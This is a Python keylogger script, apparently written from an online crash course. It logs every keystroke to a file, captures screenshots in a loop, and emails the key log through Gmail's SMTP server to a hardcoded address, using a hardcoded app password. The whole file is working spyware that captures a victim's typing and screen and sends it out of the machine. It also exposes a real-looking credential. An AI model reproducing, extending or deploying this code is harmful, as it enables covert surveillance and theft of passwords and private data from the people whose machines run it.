# Keylogger.py
# Create an Advanced Keylogger in Python - Crash Course notes
# Author: Grant Collins

# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab
from multiprocessing import Process, freeze_support

# File paths and information
keys_information = "key_log.txt"
system_information = "system_log.txt"
screenshot_directory = "C:\\Users\\varun\\.vscode\\keyloger\\screenshots"


email_address = "varunpalshiswal@gmail.com"
app_password = "v1a2r3u4n52004"


toaddr = "varunpalshiswal@gmail.com"


file_path = "C:\\Users\\varun\\.vscode\\keyloger"
extend = "\\"

# Ensure directories exist
if not os.path.exists(file_path):
    os.makedirs(file_path)
if not os.path.exists(screenshot_directory):
    os.makedirs(screenshot_directory)


# Setup Gmail part for keylogger data
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log_file"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    print(f"Attaching file: {attachment}")  # Debugging line
    try:
        with open(attachment, 'rb') as attach_file:
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attach_file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(p)
    except Exception as e:
        print(f"Error opening attachment: {e}")
        return

    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, app_password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        print("Email sent successfully!")
    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP Authentication Error: {e}")
    except smtplib.SMTPConnectError as e:
        print(f"SMTP Connection Error: {e}")
    except smtplib.SMTPException as e:
        print(f"SMTP Error: {e}")


count = 0
keys = []


def on_press(key):
    global keys, count

    print("Key pressed:", key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    print("Writing keys to file...")
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
    print("Keys written to file:", keys_information)


def on_release(key):
    if key == Key.esc:
        return False


# Capture screenshots every 10 seconds
def capture_screenshot():
    while True:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot_filename = f"screenshot_{timestamp}.png"
        screenshot_path = os.path.join(screenshot_directory, screenshot_filename)

        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        print(f"Screenshot saved to {screenshot_path}")

        time.sleep(1)


if __name__ == '__main__':
    freeze_support()

    # Start capturing screenshots in a separate process
    screenshot_process = Process(target=capture_screenshot)
    screenshot_process.start()

    # Start the keylogger
    print("Starting keylogger...")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Ensure the path is correct and the file exists
    attachment_path = file_path + extend + keys_information
    if not os.path.isfile(attachment_path):
        print(f"Error: The file {attachment_path} does not exist.")
    else:
        send_email(keys_information, attachment_path, toaddr)
